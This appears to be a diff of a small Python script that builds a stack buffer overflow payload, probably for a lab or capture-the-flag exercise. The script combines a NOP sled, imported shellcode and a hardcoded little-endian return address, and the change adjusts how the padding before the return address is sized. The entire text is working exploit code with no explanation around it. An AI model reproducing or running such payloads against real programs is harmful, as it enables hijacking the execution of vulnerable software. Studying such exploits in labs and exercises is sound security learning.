@@ -6,11 +6,10 @@
 from shellcode import shellcode
 import sys
 
-buffer_size = 1024 + 4 + 4
+buffer_size = 1024 + 4 + 4 + 4
 nop_sled = b'\x90' * (buffer_size-len(shellcode))
 payload = nop_sled + shellcode
-padding = b'FFFF'
-payload += padding + (0xfff6c840).to_bytes(4, 'little')
+payload += (0xfff6c840).to_bytes(4, 'little')
 #print(len(shellcode))
 sys.stdout.buffer.write(payload)
 
